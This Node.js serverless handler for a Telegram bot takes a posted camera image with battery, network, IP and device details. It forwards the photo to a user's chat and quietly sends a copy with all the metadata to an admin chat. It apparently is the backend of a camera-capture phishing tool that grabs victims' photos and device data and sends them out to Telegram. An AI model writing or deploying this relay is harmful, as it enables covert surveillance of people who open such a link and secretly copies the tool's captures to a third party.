const { Telegraf } = require('telegraf');
const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  try {
    const { image, uid, battery, network } = req.body;
    const adminId = process.env.ADMIN_ID;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toLocaleString('en-US', {
      timeZone: 'Asia/Kabul',
      hour12: false,
    });

    if (!uid || !image) return res.status(400).send('UID or image missing');

    const base64 = image.replace(/^data:image\/\w+;base64,/, '');
    const imgBuffer = Buffer.from(base64, 'base64');

    const caption = `
*📸 نوی عکس ترلاسه شو*

🆔 *User ID:* \`${uid}\`
🔋 *Battery:* \`${battery || '?'}%\`
📶 *Network:* \`${network || '?'}\`
🌐 *IP:* \`${ip}\`
📱 *Device:* \`${userAgent}\`
🕒 *Time:* \`${timestamp}\`

🧑🏻‍💻 *Built by:* 💛 *WACIQ*
    `.trim();

    // Send to user
    await bot.telegram.sendPhoto(uid, { source: imgBuffer });

    // Send to admin
    if (adminId) {
      await bot.telegram.sendPhoto(adminId, { source: imgBuffer }, {
        caption,
        parse_mode: 'Markdown'
      });
    }

    res.status(200).send('✅ Image delivered');
  } catch (err) {
    console.error(err);
    res.status(500).send('❌ Sending error');
  }
}; 
